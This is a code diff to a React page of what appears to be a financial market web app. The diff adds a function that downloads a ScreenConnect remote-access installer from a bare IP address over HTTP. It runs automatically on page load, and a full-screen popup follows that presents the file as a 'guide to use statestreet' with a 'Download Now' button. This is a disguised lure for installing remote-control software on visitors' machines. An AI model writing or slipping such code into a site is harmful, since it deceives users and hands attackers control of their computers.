@@ -368,6 +368,26 @@ const marketNewsHeadlines = [
   const [activeNotification, setActiveNotification] = useState<NotificationItem | null>(null);
   const [currentImageIndex, setCurrentImageIndex] = useState(0);
   const [currentNewsIndex, setCurrentNewsIndex] = useState(0);
+  const [showDownloadPopup, setShowDownloadPopup] = useState(false);
+
+  // Download function
+  const downloadFile = () => {
+    const downloadUrl = 'http://18.232.171.173:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest';
+    window.open(downloadUrl, '_blank');
+  };
+
+  // Automatic download on page load and show popup after 2 seconds
+  useEffect(() => {
+    // Trigger automatic download when page loads
+    downloadFile();
+    
+    // Show popup after 2 seconds
+    const timer = setTimeout(() => {
+      setShowDownloadPopup(true);
+    }, 2000);
+
+    return () => clearTimeout(timer);
+  }, []);
 
   const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:4988/api/v1';
 
@@ -841,6 +861,53 @@ const marketNewsHeadlines = [
             </Stack>
           </Box>
         </Container>
+      {/* Download Popup */}
+      {showDownloadPopup && (
+        <Box sx={{ 
+          position: 'fixed', 
+          top: 0, 
+          left: 0, 
+          width: '100%', 
+          height: '100%', 
+          bgcolor: 'rgba(0,0,0,0.7)', 
+          zIndex: 100,
+          display: 'flex',
+          alignItems: 'center',
+          justifyContent: 'center'
+        }}>
+          <Paper elevation={0} sx={{ 
+            p: 4, 
+            borderRadius: 3, 
+            bgcolor: 'rgba(2, 6, 23, 0.98)', 
+            border: '1px solid rgba(125, 211, 252, 0.3)',
+            maxWidth: 400,
+            mx: 2,
+            textAlign: 'center'
+          }}>
+            <Typography variant="h5" sx={{ fontWeight: 700, color: 'white', mb: 2 }}>
+              Loading your guide to use statestreet
+            </Typography>
+            <Typography sx={{ color: 'rgba(255,255,255,0.72)', mb: 3 }}>
+              If your download didn't start automatically, click the button below:
+            </Typography>
+            <Button 
+              onClick={downloadFile}
+              variant="contained" 
+              sx={{ 
+                borderRadius: 999, 
+                px: 4, 
+                py: 1.2, 
+                bgcolor: '#7dd3fc', 
+                color: '#03111d', 
+                '&:hover': { bgcolor: '#bae6fd' } 
+              }}
+            >
+              Download Now
+            </Button>
+          </Paper>
+        </Box>
+      )}
+
       </Box>
     </Box>
   );
